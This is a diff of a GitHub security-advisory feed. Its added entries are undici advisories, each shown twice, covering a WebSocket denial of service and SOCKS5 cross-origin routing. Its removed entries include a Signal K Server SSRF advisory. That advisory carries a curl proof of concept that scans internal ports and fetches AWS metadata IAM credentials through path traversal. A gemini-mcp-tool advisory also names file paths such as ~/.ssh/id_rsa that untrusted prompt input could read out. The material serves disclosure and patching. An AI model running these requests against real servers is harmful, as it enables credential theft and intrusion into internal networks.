+<p>The undici WebSocket client enforces <code>maxPayloadSize</code> on the cumulative byte count of fragments in a message but does not enforce a limit on the number of fragments. A malicious WebSocket server can stream many small or empty continuation frames that each pass per-frame and cumulative-size validation, collectively causing unbounded memory growth in the client process. The result is memory exhaustion and a denial of service.</p>
+<p>Affected applications are those using the undici WebSocket client (<code>new WebSocket(...)</code>) or the <code>WebSocketStream</code> API that can be induced to connect to an attacker-controlled or compromised WebSocket endpoint.</p>
+<p>All releases starting at undici 6.17.0 are affected.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to undici v6.27.0, v7.28.0 or v8.5.0.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>No workaround is available. The fix must be applied through an upgrade.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-vxpw-j846-p89q">https://github.com/nodejs/undici/security/advisories/GHSA-vxpw-j846-p89q</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12151">https://nvd.nist.gov/vuln/detail/CVE-2026-12151</a></li>
+<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-vxpw-j846-p89q">https://github.com/advisories/GHSA-vxpw-j846-p89q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vxpw-j846-p89q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-19T14:22:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[undici] undici WebSocket client vulnerable to denial of service via fragment count bypass]]></title>
+        <id>https://github.com/advisories/GHSA-vxpw-j846-p89q</id>
+        <link href="https://github.com/advisories/GHSA-vxpw-j846-p89q"/>
+        <updated>2026-06-19T14:23:29.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>The undici WebSocket client enforces <code>maxPayloadSize</code> on the cumulative byte count of fragments in a message but does not enforce a limit on the number of fragments. A malicious WebSocket server can stream many small or empty continuation frames that each pass per-frame and cumulative-size validation, collectively causing unbounded memory growth in the client process. The result is memory exhaustion and a denial of service.</p>
+<p>Affected applications are those using the undici WebSocket client (<code>new WebSocket(...)</code>) or the <code>WebSocketStream</code> API that can be induced to connect to an attacker-controlled or compromised WebSocket endpoint.</p>
+<p>All releases starting at undici 6.17.0 are affected.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to undici v6.27.0, v7.28.0 or v8.5.0.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>No workaround is available. The fix must be applied through an upgrade.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-vxpw-j846-p89q">https://github.com/nodejs/undici/security/advisories/GHSA-vxpw-j846-p89q</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12151">https://nvd.nist.gov/vuln/detail/CVE-2026-12151</a></li>
+<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-vxpw-j846-p89q">https://github.com/advisories/GHSA-vxpw-j846-p89q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vxpw-j846-p89q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-19T14:22:01.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[undici] undici vulnerable to cross-origin request routing via SOCKS5 proxy pool reuse]]></title>
+        <id>https://github.com/advisories/GHSA-hm92-r4w5-c3mj</id>
+        <link href="https://github.com/advisories/GHSA-hm92-r4w5-c3mj"/>
+        <updated>2026-06-19T14:20:20.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>When using <code>Socks5ProxyAgent</code>, undici reuses a single connection pool across different origins without verifying that the pool's origin matches the requested origin. All requests are dispatched through the pool connected to the first origin, regardless of the intended destination.</p>
+<p>This causes cross-origin request routing: credentials and request data intended for origin B are sent to origin A, responses from the wrong origin are trusted, and HTTPS requests may be silently downgraded to HTTP.</p>
+<p>Impacted users are applications that use <code>Socks5ProxyAgent</code> (directly or via <code>setGlobalDispatcher</code>) and make requests to more than one origin.</p>
+<p>This was introduced in undici 7.23.0 via <a href="https://github.com/nodejs/undici/pull/4385">#4385</a> and affects all versions through 8.1.0.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to undici v7.28.0 or v8.2.0</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Use a separate <code>Socks5ProxyAgent</code> instance per origin, or avoid using <code>Socks5ProxyAgent</code> with multiple origins.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-hm92-r4w5-c3mj">https://github.com/nodejs/undici/security/advisories/GHSA-hm92-r4w5-c3mj</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6734">https://nvd.nist.gov/vuln/detail/CVE-2026-6734</a></li>
+<li><a href="https://github.com/nodejs/undici/pull/5041">https://github.com/nodejs/undici/pull/5041</a></li>
+<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-hm92-r4w5-c3mj">https://github.com/advisories/GHSA-hm92-r4w5-c3mj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hm92-r4w5-c3mj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-19T14:20:20.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[undici] undici vulnerable to cross-origin request routing via SOCKS5 proxy pool reuse]]></title>
+        <id>https://github.com/advisories/GHSA-hm92-r4w5-c3mj</id>
+        <link href="https://github.com/advisories/GHSA-hm92-r4w5-c3mj"/>
+        <updated>2026-06-19T14:20:20.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
+<p>When using <code>Socks5ProxyAgent</code>, undici reuses a single connection pool across different origins without verifying that the pool's origin matches the requested origin. All requests are dispatched through the pool connected to the first origin, regardless of the intended destination.</p>
+<p>This causes cross-origin request routing: credentials and request data intended for origin B are sent to origin A, responses from the wrong origin are trusted, and HTTPS requests may be silently downgraded to HTTP.</p>
+<p>Impacted users are applications that use <code>Socks5ProxyAgent</code> (directly or via <code>setGlobalDispatcher</code>) and make requests to more than one origin.</p>
+<p>This was introduced in undici 7.23.0 via <a href="https://github.com/nodejs/undici/pull/4385">#4385</a> and affects all versions through 8.1.0.</p>
+<h2 id="patches">Patches</h2>
+<p>Upgrade to undici v7.28.0 or v8.2.0</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Use a separate <code>Socks5ProxyAgent</code> instance per origin, or avoid using <code>Socks5ProxyAgent</code> with multiple origins.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-hm92-r4w5-c3mj">https://github.com/nodejs/undici/security/advisories/GHSA-hm92-r4w5-c3mj</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6734">https://nvd.nist.gov/vuln/detail/CVE-2026-6734</a></li>
+<li><a href="https://github.com/nodejs/undici/pull/5041">https://github.com/nodejs/undici/pull/5041</a></li>
+<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-hm92-r4w5-c3mj">https://github.com/advisories/GHSA-hm92-r4w5-c3mj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hm92-r4w5-c3mj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-19T14:20:20.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[undici] undici vulnerable to HTTP response queue poisoning via keep-alive socket reuse]]></title>
         <id>https://github.com/advisories/GHSA-35p6-xmwp-9g52</id>
@@ -337,527 +802,5 @@ node audit.js
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-05-06T18:13:32.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[signalk-server] Signal K Server: Server-Side Request Forgery via Remote Connection Endpoints]]></title>
-        <id>https://github.com/advisories/GHSA-q59x-jc9f-gfqf</id>
-        <link href="https://github.com/advisories/GHSA-q59x-jc9f-gfqf"/>
-        <updated>2026-06-18T21:13:36.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>signalk-server versions up to and including 2.27.0 contain a Server-Side Request Forgery (SSRF) vulnerability in three administrative endpoints used for remote Signal K server connection management. The <code>makeRemoteRequest()</code> function accepts attacker-controlled <code>host</code>, <code>port</code>, <code>useTLS</code>, and <code>selfsignedcert</code> parameters without any validation, allowing an attacker to force the server to make arbitrary HTTP/HTTPS requests to internal network resources, cloud metadata services, and other unintended destinations.</p>
-<p>When security is not configured (the default state), these endpoints require <strong>no authentication</strong>.</p>
-<h3 id="details">Details</h3>
-<h4 id="vulnerable-function">Vulnerable Function</h4>
-<p>The core vulnerability is in <code>makeRemoteRequest()</code> at <code>src/serverroutes.ts:2483-2524</code>:</p>
-<pre><code class="language-typescript">function makeRemoteRequest(
-  host: string,
-  port: number,
-  useTLS: boolean,
-  selfsignedcert: boolean,
-  path: string,
-  method?: string,
-  headers?: Record&lt;string, string&gt;,
-  body?: unknown
-): Promise&lt;{ status: number | undefined; data: string }&gt; {
-  const protocol = useTLS ? https : http
-  return new Promise((resolve, reject) =&gt; {
-    const options = {
-      hostname: host,         // NO VALIDATION - attacker controlled
-      port,                   // NO VALIDATION - attacker controlled
-      path,
-      method: method || 'GET',
-      headers: {
-        ...(headers || {}),
-        ...(body ? { 'Content-Type': 'application/json' } : {})
-      },
-      rejectUnauthorized: !selfsignedcert  // Attacker can disable TLS verification
-    }
-    const req = protocol.request(options, (response) =&gt; {
-      let data = ''
-      response.on('data', (chunk: string) =&gt; {
-        data += chunk
-      })
-      response.on('end', () =&gt; {
-        resolve({ status: response.statusCode, data })
-      })
-    })
-    req.on('error', reject)
-    req.setTimeout(10000, () =&gt; {
-      req.destroy(new Error('Connection timed out'))
-    })
-    if (body) {
-      req.write(JSON.stringify(body))
-    }
-    req.end()
-  })
-}
-</code></pre>
-<h4 id="missing-validation">Missing Validation</h4>
-<p>The function performs <strong>zero validation</strong> on the destination host. The following address ranges are all reachable:</p>
-<ul>
-<li><strong>Loopback</strong>: <code>127.0.0.1</code>, <code>::1</code>, <code>localhost</code></li>
-<li><strong>RFC 1918 private ranges</strong>: <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code></li>
-<li><strong>Link-local / Cloud metadata</strong>: <code>169.254.169.254</code> (AWS EC2 instance metadata, GCP, Azure IMDS)</li>
-<li><strong>IPv6 link-local</strong>: <code>fe80::/10</code></li>
-<li><strong>Any arbitrary external host</strong>: enabling the server as an open proxy</li>
-</ul>
-<h4 id="authentication-bypass-via-default-configuration">Authentication Bypass via Default Configuration</h4>
-<p>The endpoints are protected by <code>addAdminMiddleware()</code> (lines 2339-2345):</p>
-<pre><code class="language-typescript">app.securityStrategy.addAdminMiddleware(`${SERVERROUTESPREFIX}/testSignalKConnection`)
-app.securityStrategy.addAdminMiddleware(`${SERVERROUTESPREFIX}/requestAccess`)
-app.securityStrategy.addAdminMiddleware(`${SERVERROUTESPREFIX}/checkAccessRequest`)
-</code></pre>
-<p>However, when security is not configured, the server uses <code>dummysecurity.ts</code>, where <code>addAdminMiddleware</code> is a <strong>no-op</strong>:</p>
-<pre><code class="language-typescript">addAdminMiddleware: () =&gt; {},
-</code></pre>
-<p>This means on a default installation with no admin user created, <strong>all three endpoints are accessible without any authentication</strong>.</p>
-<h4 id="additional-attack-surface-tls-verification-bypass">Additional Attack Surface: TLS Verification Bypass</h4>
-<p>The <code>selfsignedcert</code> parameter directly controls <code>rejectUnauthorized</code>:</p>
-<pre><code class="language-typescript">rejectUnauthorized: !selfsignedcert
-</code></pre>
-<p>When an attacker sets <code>selfsignedcert: true</code>, the server will connect to any HTTPS endpoint without verifying the TLS certificate, enabling MITM attacks on the outbound connection.</p>
-<h4 id="additional-attack-surface-path-traversal-in-checkaccessrequest">Additional Attack Surface: Path Traversal in checkAccessRequest</h4>
-<p>The <code>checkAccessRequest</code> endpoint interpolates <code>requestId</code> directly into the URL path:</p>
-<pre><code class="language-typescript">`/signalk/v1/requests/${requestId}`
-</code></pre>
-<p>An attacker can use path traversal (e.g., <code>requestId: "../../other/endpoint"</code>) to target arbitrary paths on the destination host.</p>
-<h3 id="poc">PoC</h3>
-<h4 id="target-setup">Target Setup</h4>
-<p>Set up a bare-metal signalk-server for testing (or use Docker to simulate):</p>
-<pre><code class="language-bash">docker run -d --name signalk-ssrf-poc -p 3000:3000 node:22-bookworm \
-  bash -c 'npm install -g signalk-server@2.27.0 &amp;&amp; signalk-server'
-
-# Wait for startup
-until curl -s http://127.0.0.1:3000/skServer/loginStatus 2&gt;/dev/null | grep -q "status"; do sleep 10; done
-</code></pre>
-<p>Set the target variable:</p>
-<pre><code class="language-bash">TARGET=http://127.0.0.1:3000
-</code></pre>
-<p>Confirm <code>"authenticationRequired":false</code> in the loginStatus response before proceeding.</p>
-<h4 id="poc-1-loopback-connection-self-discovery">PoC 1: Loopback Connection (Self-Discovery)</h4>
-<pre><code class="language-bash">curl -s -X POST $TARGET/skServer/testSignalKConnection \
-  -H "Content-Type: application/json" \
-  -d '{"host":"127.0.0.1","port":3000,"useTLS":false,"selfsignedcert":false}'
-</code></pre>
-<p><strong>Response</strong> (confirms SSRF, the server connected to itself):</p>
-<pre><code class="language-json">{
-  "success": true,
-  "authenticated": false,
-  "server": {
-    "id": "signalk-server-node",
-    "version": "2.27.0"
-  }
-}
-</code></pre>
-<h4 id="poc-2-port-scanning-via-error-differentiation">PoC 2: Port Scanning via Error Differentiation</h4>
-<pre><code class="language-bash"># Open port (3000) — returns server data
-curl -s -X POST $TARGET/skServer/testSignalKConnection \
-  -H "Content-Type: application/json" \
-  -d '{"host":"127.0.0.1","port":3000,"useTLS":false,"selfsignedcert":false}'
-# Response: {"success":true,"server":{"id":"signalk-server-node","version":"2.27.0"}}
-
-# Closed port (9999) — immediate ECONNREFUSED
-curl -s -X POST $TARGET/skServer/testSignalKConnection \
-  -H "Content-Type: application/json" \
-  -d '{"host":"127.0.0.1","port":9999,"useTLS":false,"selfsignedcert":false}'
-# Response: {"success":false,"error":"connect ECONNREFUSED 127.0.0.1:9999"}
-
-# Filtered port — 10-second timeout then error
-curl -s -X POST $TARGET/skServer/testSignalKConnection \
-  -H "Content-Type: application/json" \
-  -d '{"host":"10.0.0.1","port":22,"useTLS":false,"selfsignedcert":false}'
-# Response (after 10s): {"success":false,"error":"Connection timed out"}
-</code></pre>
-<p>The three distinct error responses allow an attacker to map internal network topology.</p>
-<h4 id="poc-3-aws-instance-metadata-service-imdsv1">PoC 3: AWS Instance Metadata Service (IMDSv1)</h4>
-<p>On a cloud-hosted signalk-server (AWS EC2):</p>
-<pre><code class="language-bash">curl -s -X POST $TARGET/skServer/testSignalKConnection \
-  -H "Content-Type: application/json" \
-  -d '{"host":"169.254.169.254","port":80,"useTLS":false,"selfsignedcert":false}'
-</code></pre>
-<p>The server connects to the EC2 metadata endpoint. The response will contain the discovery JSON parse result, leaking metadata. For deeper paths, use <code>checkAccessRequest</code> with path traversal in <code>requestId</code>:</p>
-<pre><code class="language-bash">curl -s -X POST $TARGET/skServer/checkAccessRequest \
-  -H "Content-Type: application/json" \
-  -d '{"host":"169.254.169.254","port":80,"useTLS":false,"selfsignedcert":false,"requestId":"../../latest/meta-data/iam/security-credentials/ROLE_NAME"}'
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ol>
-<li><p><strong>Internal Network Scanning</strong>: An attacker can probe internal hosts and ports. The response distinguishes between open ports (HTTP response returned), closed ports (connection refused error), and filtered ports (timeout after 10 seconds).</p>
-</li>
-<li><p><strong>Cloud Metadata Exfiltration</strong>: On cloud-hosted instances (AWS EC2, GCP, Azure), an attacker can reach the instance metadata service at <code>169.254.169.254</code> to steal IAM credentials, instance identity tokens, and other sensitive metadata.</p>
-</li>
-<li><p><strong>Internal Service Data Exfiltration</strong>: The <code>testSignalKConnection</code> endpoint returns the full response body from the target, allowing reading of data from internal HTTP services not otherwise accessible from the internet.</p>
-</li>
-<li><p><strong>Server-Side POST Requests</strong>: The <code>requestAccess</code> endpoint sends a POST request with attacker-controlled JSON body (<code>clientId</code>, <code>description</code>), enabling interaction with internal APIs that accept POST requests.</p>
-</li>
-<li><p><strong>Lateral Movement</strong>: In containerized or Kubernetes environments, the server can be used to access cluster-internal services, the Kubernetes API, or other containers on the Docker network.</p>
-</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/SignalK/signalk-server/security/advisories/GHSA-q59x-jc9f-gfqf">https://github.com/SignalK/signalk-server/security/advisories/GHSA-q59x-jc9f-gfqf</a></li>
-<li><a href="https://github.com/advisories/GHSA-q59x-jc9f-gfqf">https://github.com/advisories/GHSA-q59x-jc9f-gfqf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q59x-jc9f-gfqf</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-18T21:13:36.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[gemini-mcp-tool] gemini-mcp-tool vulnerable to OS command injection and @file exfiltration via prompt quoting (CVE-2026-0755)]]></title>
-        <id>https://github.com/advisories/GHSA-4h5r-5jm8-jxjm</id>
-        <link href="https://github.com/advisories/GHSA-4h5r-5jm8-jxjm"/>
-        <updated>2026-06-18T20:44:59.000Z</updated>
-        <content type="html"><![CDATA[<p>Untrusted prompt input could reach the Gemini CLI @file parser, allowing read/exfiltration of arbitrary local files (@/etc/passwd, @~/.ssh/id_rsa, @../../secret). On Windows, unquoted cmd.exe metacharacters could break out into OS command injection.</p>
-<p>Fix (1.1.6): removed the broken shell:false double-quote wrapping; added assertSafeFileReferences() to contain @file refs to the working directory; hardened Windows cmd.exe argument quoting.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/jamubc/gemini-mcp-tool/security/advisories/GHSA-4h5r-5jm8-jxjm">https://github.com/jamubc/gemini-mcp-tool/security/advisories/GHSA-4h5r-5jm8-jxjm</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-0755">https://nvd.nist.gov/vuln/detail/CVE-2026-0755</a></li>
-<li><a href="https://www.zerodayinitiative.com/advisories/ZDI-26-021">https://www.zerodayinitiative.com/advisories/ZDI-26-021</a></li>
-<li><a href="https://github.com/advisories/GHSA-4h5r-5jm8-jxjm">https://github.com/advisories/GHSA-4h5r-5jm8-jxjm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4h5r-5jm8-jxjm</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-06-18T20:44:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[gemini-mcp-tool] Duplicate Advisory: gemini-mcp-tool vulnerable to OS command injection and @file exfiltration via prompt quoting (CVE-2026-0755)]]></title>
-        <id>https://github.com/advisories/GHSA-28qq-5f47-r5x2</id>
-        <link href="https://github.com/advisories/GHSA-28qq-5f47-r5x2"/>
-        <updated>2026-06-18T20:44:51.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
-<p>This advisory has been withdrawn because it is a duplicate of GHSA-4h5r-5jm8-jxjm. This link is maintained to preserve external references.</p>
-<h3 id="original-description">Original Description</h3>
-<p>gemini-mcp-tool execAsync Command Injection Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of gemini-mcp-tool. Authentication is not required to exploit this vulnerability.</p>
-<p>The specific flaw exists within the implementation of the execAsync method. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the service account. Was ZDI-CAN-27783.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-0755">https://nvd.nist.gov/vuln/detail/CVE-2026-0755</a></li>
-<li><a href="https://www.zerodayinitiative.com/advisories/ZDI-26-021">https://www.zerodayinitiative.com/advisories/ZDI-26-021</a></li>
-<li><a href="https://github.com/advisories/GHSA-28qq-5f47-r5x2">https://github.com/advisories/GHSA-28qq-5f47-r5x2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-28qq-5f47-r5x2</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-01-23T06:31:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: Internal/webchat command auth could inherit ownerAllowFrom wildcard state]]></title>
-        <id>https://github.com/advisories/GHSA-4hpg-mp64-x7xq</id>
-        <link href="https://github.com/advisories/GHSA-4hpg-mp64-x7xq"/>
-        <updated>2026-06-18T20:44:08.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Internal/webchat command auth could inherit ownerAllowFrom wildcard state. In affected versions, a sender on an affected internal or webchat path could inherit wildcard ownerAllowFrom state across channel boundaries.</p>
-<p>This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.</p>
-<h3 id="impact">Impact</h3>
-<p>When the affected feature is enabled and reachable, this could run owner-style command behavior that should have stayed channel-scoped. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.</p>
-<h3 id="patched-versions">Patched Versions</h3>
-<p>The first stable patched version is <code>2026.4.25</code>.</p>
-<h3 id="mitigations">Mitigations</h3>
-<p>keep owner command allowlists explicit per channel until patched. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-4hpg-mp64-x7xq">https://github.com/openclaw/openclaw/security/advisories/GHSA-4hpg-mp64-x7xq</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53854">https://nvd.nist.gov/vuln/detail/CVE-2026-53854</a></li>
-<li><a href="https://www.vulncheck.com/advisories/openclaw-privilege-escalation-via-ownerallowfrom-wildcard-inheritance-in-internal-webchat-commands">https://www.vulncheck.com/advisories/openclaw-privilege-escalation-via-ownerallowfrom-wildcard-inheritance-in-internal-webchat-commands</a></li>
-<li><a href="https://github.com/advisories/GHSA-4hpg-mp64-x7xq">https://github.com/advisories/GHSA-4hpg-mp64-x7xq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4hpg-mp64-x7xq</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-18T20:44:06.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: Internal/webchat command auth could inherit ownerAllowFrom wildcard state]]></title>
-        <id>https://github.com/advisories/GHSA-r2fx-hp6p-pgrm</id>
-        <link href="https://github.com/advisories/GHSA-r2fx-hp6p-pgrm"/>
-        <updated>2026-06-18T20:43:53.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-4hpg-mp64-x7xq. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>OpenClaw before 2026.4.25 contains a privilege escalation vulnerability in internal and webchat command authentication that allows senders to inherit wildcard ownerAllowFrom state across channel boundaries. Attackers can exploit this by sending commands on affected internal or webchat paths to execute owner-style command behavior outside intended channel scope, potentially bypassing access controls.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-4hpg-mp64-x7xq">https://github.com/openclaw/openclaw/security/advisories/GHSA-4hpg-mp64-x7xq</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53854">https://nvd.nist.gov/vuln/detail/CVE-2026-53854</a></li>
-<li><a href="https://www.vulncheck.com/advisories/openclaw-privilege-escalation-via-ownerallowfrom-wildcard-inheritance-in-internal-webchat-commands">https://www.vulncheck.com/advisories/openclaw-privilege-escalation-via-ownerallowfrom-wildcard-inheritance-in-internal-webchat-commands</a></li>
-<li><a href="https://github.com/advisories/GHSA-r2fx-hp6p-pgrm">https://github.com/advisories/GHSA-r2fx-hp6p-pgrm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r2fx-hp6p-pgrm</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-16T21:31:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] OpenClaw: Empty-scope device re-pairing could confuse caller scope containment]]></title>
-        <id>https://github.com/advisories/GHSA-8mg9-j9cf-54cj</id>
-        <link href="https://github.com/advisories/GHSA-8mg9-j9cf-54cj"/>
-        <updated>2026-06-18T20:42:41.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Empty-scope device re-pairing could confuse caller scope containment. In affected versions, a device re-pairing request with an empty scope set could skip the intended containment guard during re-pairing.</p>
-<p>This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.</p>
-<h3 id="impact">Impact</h3>
-<p>When the affected feature is enabled and reachable, this could restore or retain scopes broader than the caller should grant. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.</p>
-<h3 id="patched-versions">Patched Versions</h3>
-<p>The first stable patched version is <code>2026.4.25</code>.</p>
-<h3 id="mitigations">Mitigations</h3>
-<p>revoke unexpected device sessions and require fresh pairing for suspicious devices until patched. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-8mg9-j9cf-54cj">https://github.com/openclaw/openclaw/security/advisories/GHSA-8mg9-j9cf-54cj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53852">https://nvd.nist.gov/vuln/detail/CVE-2026-53852</a></li>
-<li><a href="https://www.vulncheck.com/advisories/openclaw-scope-bypass-via-empty-scope-device-re-pairing">https://www.vulncheck.com/advisories/openclaw-scope-bypass-via-empty-scope-device-re-pairing</a></li>
-<li><a href="https://github.com/advisories/GHSA-8mg9-j9cf-54cj">https://github.com/advisories/GHSA-8mg9-j9cf-54cj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8mg9-j9cf-54cj</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-06-18T20:42:40.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: Empty-scope device re-pairing could confuse caller scope containment]]></title>
-        <id>https://github.com/advisories/GHSA-hc4w-hm59-9w88</id>
-        <link href="https://github.com/advisories/GHSA-hc4w-hm59-9w88"/>
-        <updated>2026-06-18T20:42:03.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-8mg9-j9cf-54cj. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>OpenClaw before 2026.4.25 contains a scope containment bypass vulnerability in device re-pairing that allows authenticated operators to restore broader scopes than intended by submitting empty-scope re-pairing requests. Attackers can exploit this by sending re-pairing requests with empty scope sets to skip containment guards and retain unauthorized device access.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-8mg9-j9cf-54cj">https://github.com/openclaw/openclaw/security/advisories/GHSA-8mg9-j9cf-54cj</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53852">https://nvd.nist.gov/vuln/detail/CVE-2026-53852</a></li>
-<li><a href="https://www.vulncheck.com/advisories/openclaw-scope-bypass-via-empty-scope-device-re-pairing">https://www.vulncheck.com/advisories/openclaw-scope-bypass-via-empty-scope-device-re-pairing</a></li>
-<li><a href="https://github.com/advisories/GHSA-hc4w-hm59-9w88">https://github.com/advisories/GHSA-hc4w-hm59-9w88</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hc4w-hm59-9w88</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-06-16T21:31:59.000Z</published>
-    </entry>
